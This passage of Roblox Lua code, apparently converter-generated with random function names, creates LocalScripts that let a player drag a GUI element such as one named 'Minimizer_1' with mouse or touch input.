UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(ZpYSUeIvTNsgAkoK)()


local function aEWsmGpmPuEDKWbO()
local script = Instance.new("LocalScript",Minimizer_1)

local UserInputService = game:GetService("UserInputService")

local gui = script.Parent
local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(aEWsmGpmPuEDKWbO)()
